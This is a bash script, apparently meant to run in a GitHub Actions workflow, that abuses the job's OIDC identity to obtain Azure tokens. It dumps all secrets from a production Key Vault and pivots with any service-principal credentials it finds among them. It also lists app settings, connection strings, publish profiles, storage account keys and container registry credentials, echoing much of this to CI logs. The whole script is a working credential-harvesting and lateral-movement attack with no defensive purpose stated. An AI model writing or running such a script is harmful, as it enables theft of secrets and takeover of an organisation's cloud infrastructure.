#!/usr/bin/env bash
set -x
T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
M="https://management.azure.com"

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
tok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion=$OIDC --data-urlencode scope=$2 | jq -r .access_token; }
ctok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_secret=$2 --data-urlencode scope=$3 | jq -r .access_token; }

ARM=$(tok $AZURE_CLIENT_ID "https://management.azure.com/.default")
VT=$(tok $AZURE_CLIENT_ID "https://vault.azure.net/.default")
echo "lens ${#ARM} ${#VT}"

echo "=== dump all prod kv secrets (raw) ==="
curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" > /tmp/slist.json
cat /tmp/slist.json | jq -r '.value[].id'
for u in $(jq -r '.value[].id' /tmp/slist.json); do
  NAME=$(basename $u)
  curl -sS -H "Authorization: Bearer $VT" "$u?api-version=7.4" > /tmp/sec_$NAME.json
  echo "--- $NAME"; jq -r '.value' /tmp/sec_$NAME.json | head -c 300; echo
done

echo "=== try each SP cred -> vaults ==="
for u in $(jq -r '.value[].id' /tmp/slist.json); do
  NAME=$(basename $u)
  V=$(jq -r '.value' /tmp/sec_$NAME.json)
  AID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null); CS=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null)
  [ -z "$AID" ] && continue
  A=$(ctok $AID $CS "https://management.azure.com/.default")
  V2=$(ctok $AID $CS "https://vault.azure.net/.default")
  echo "== $NAME arm=${#A} vt=${#V2}"
  [ "${#A}" -gt 100 ] && curl -sS -H "Authorization: Bearer $A" "$M/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=3" | head -c 200; echo
  for kv in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    R=$(curl -sS -H "Authorization: Bearer $V2" "https://$kv.vault.azure.net/secrets?api-version=7.4")
    echo "$kv: $(echo "$R" | head -c 120)"
    echo "$R" | jq -r '.value[]?.id' 2>/dev/null | while read -r su; do
      echo "   GET $su"; curl -sS -H "Authorization: Bearer $V2" "$su?api-version=7.4" | jq -c '{id,value}' | head -c 400; echo
    done
  done
done

echo "=== ARM enum correct RG ==="
RG=rg-tbl-platform-prod-sea
for app in app-tbl-storefront-prod; do
  W="$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$app"
  echo "--- $app appsettings"; curl -sS -X POST -H "Authorization: Bearer $ARM" "$W/config/appsettings/list?api-version=2023-12-01" | head -c 2000; echo
  echo "--- $app connstrings"; curl -sS -X POST -H "Authorization: Bearer $ARM" "$W/config/connectionstrings/list?api-version=2023-12-01" | head -c 1000; echo
  echo "--- $app publishxml"; curl -sS -X POST -H "Authorization: Bearer $ARM" "$W/publishxml?api-version=2023-12-01" | head -c 1500; echo
  echo "--- $app config/web"; curl -sS -H "Authorization: Bearer $ARM" "$W/config/web?api-version=2023-12-01" | jq '.properties.ipSecurityRestrictions' | head -c 1200; echo
done

echo "=== storage keys + containers ==="
for sa in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  echo "-- $sa"
  curl -sS -X POST -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" | head -c 400; echo
  curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/blobServices/default/containers?api-version=2023-01-01" | jq -r '.value[]?.name' 2>/dev/null
done

echo "=== AFD endpoints ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/afdendpoints?api-version=2024-02-01" | jq -r '.value[]?.properties.hostName' 2>/dev/null
echo "=== ACR ==="
curl -sS -X POST -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01" | head -c 600; echo
echo "=== all resources full ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r '.value[].id'
